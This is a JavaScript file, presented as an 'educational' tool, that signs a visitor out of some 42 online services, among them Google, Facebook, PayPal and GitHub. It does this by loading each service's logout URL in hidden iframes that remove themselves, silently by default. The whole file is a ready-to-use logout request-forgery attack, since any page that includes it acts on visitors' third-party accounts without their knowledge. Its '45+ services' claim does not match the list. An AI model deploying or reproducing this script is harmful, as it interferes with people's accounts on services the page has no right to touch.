/**
 * index.js – Educational Session Logout Tool
 * ------------------------------------------------------------------
 * WARNING: This script attempts to log the current user out of many
 *          online services (Google, Facebook, Twitter, etc.).
 *          It demonstrates how session cookies can be invalidated.
 *
 *          USE ONLY ON YOUR OWN PAGES OR WITH EXPLICIT PERMISSION!
 * ------------------------------------------------------------------
 * 
 * Usage:
 *   <button onclick="index.logoutFromEverything()">NUKE SESSIONS</button>
 *   (Make sure this file is loaded as <script src="index.js"></script>)
 */

(function(global) {
    'use strict';

    // 45+ services with logout URLs (GET endpoints)
    const LOGOUT_ENDPOINTS = [
        { name: "Google", url: "https://accounts.google.com/Logout" },
        { name: "YouTube", url: "https://accounts.google.com/Logout" },
        { name: "Gmail", url: "https://mail.google.com/mail/?logout=true" },
        { name: "Facebook", url: "https://www.facebook.com/logout.php?confirm=1" },
        { name: "Twitter", url: "https://twitter.com/logout" },
        { name: "Instagram", url: "https://www.instagram.com/accounts/logout/" },
        { name: "Microsoft", url: "https://login.live.com/logout.srf" },
        { name: "Office 365", url: "https://login.microsoftonline.com/logout" },
        { name: "Amazon", url: "https://www.amazon.com/ap/signout" },
        { name: "LinkedIn", url: "https://www.linkedin.com/uas/logout" },
        { name: "Reddit", url: "https://www.reddit.com/logout" },
        { name: "GitHub", url: "https://github.com/logout" },
        { name: "Spotify", url: "https://accounts.spotify.com/en/logout" },
        { name: "Twitch", url: "https://www.twitch.tv/logout" },
        { name: "PayPal", url: "https://www.paypal.com/logout" },
        { name: "eBay", url: "https://signin.ebay.com/ws/eBayISAPI.dll?SignOut" },
        { name: "Yahoo", url: "https://login.yahoo.com/config/login?logout=1" },
        { name: "Netflix", url: "https://www.netflix.com/Logout" },
        { name: "Dropbox", url: "https://www.dropbox.com/logout" },
        { name: "Pinterest", url: "https://www.pinterest.com/logout/" },
        { name: "Apple iCloud", url: "https://www.icloud.com/logout" },
        { name: "Apple ID", url: "https://appleid.apple.com/signout" },
        { name: "Discord", url: "https://discord.com/logout" },
        { name: "Stack Overflow", url: "https://stackoverflow.com/users/logout" },
        { name: "Tumblr", url: "https://www.tumblr.com/logout" },
        { name: "Flickr", url: "https://www.flickr.com/signout" },
        { name: "Adobe", url: "https://account.adobe.com/logout" },
        { name: "Slack", url: "https://slack.com/logout" },
        { name: "Zoom", url: "https://zoom.us/logout" },
        { name: "Quora", url: "https://www.quora.com/logout" },
        { name: "Medium", url: "https://medium.com/logout" },
        { name: "WordPress", url: "https://wordpress.com/logout" },
        { name: "Atlassian", url: "https://id.atlassian.com/logout" },
        { name: "TikTok", url: "https://www.tiktok.com/logout" },
        { name: "Snapchat", url: "https://accounts.snapchat.com/accounts/logout" },
        { name: "HBO Max", url: "https://play.max.com/logout" },
        { name: "SoundCloud", url: "https://soundcloud.com/logout" },
        { name: "WhatsApp Web", url: "https://web.whatsapp.com/logout" },
        { name: "Epic Games", url: "https://www.epicgames.com/id/logout" },
        { name: "Steam", url: "https://steamcommunity.com/logout" },
        { name: "Imgur", url: "https://imgur.com/signout" },
        { name: "Canva", url: "https://www.canva.com/logout" }
    ];

    let activeFrames = [];

    function cleanupFrame(iframe) {
        setTimeout(() => {
            if (iframe && iframe.remove) iframe.remove();
            const idx = activeFrames.indexOf(iframe);
            if (idx !== -1) activeFrames.splice(idx, 1);
        }, 2000);
    }

    function sendLogoutViaIframe(url, timeoutMs = 4000) {
        return new Promise((resolve) => {
            if (!url) return resolve(false);
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.style.position = 'absolute';
            iframe.style.visibility = 'hidden';
            iframe.sandbox = 'allow-same-origin allow-scripts allow-forms allow-popups';
            let resolved = false;

            const timer = setTimeout(() => {
                if (!resolved) {
                    resolved = true;
                    cleanupFrame(iframe);
                    resolve(true);
                }
            }, timeoutMs);

            iframe.onload = () => {
                if (!resolved) {
                    resolved = true;
                    clearTimeout(timer);
                    cleanupFrame(iframe);
                    resolve(true);
                }
            };
            iframe.onerror = () => {
                if (!resolved) {
                    resolved = true;
                    clearTimeout(timer);
                    cleanupFrame(iframe);
                    resolve(false);
                }
            };
            try {
                iframe.src = url;
                document.body.appendChild(iframe);
                activeFrames.push(iframe);
            } catch(e) {
                clearTimeout(timer);
                resolve(false);
            }
        });
    }

    // Public API object named "index"
    const index = {
        async logoutFromEverything(options = { silent: true }) {
            if (!options.silent) console.log("[index] Mass logout started");
            const promises = [];
            for (const service of LOGOUT_ENDPOINTS) {
                promises.push(sendLogoutViaIframe(service.url));
                await new Promise(r => setTimeout(r, 8));
            }
            await Promise.allSettled(promises);
            if (!options.silent) console.log("[index] Logout requests sent");
            setTimeout(() => {
                activeFrames.forEach(f => f?.remove());
                activeFrames = [];
            }, 4000);
        },
        cleanup() {
            activeFrames.forEach(f => f?.remove());
            activeFrames = [];
        }
    };

    // Expose globally as "index"
    global.index = index;
})(window);
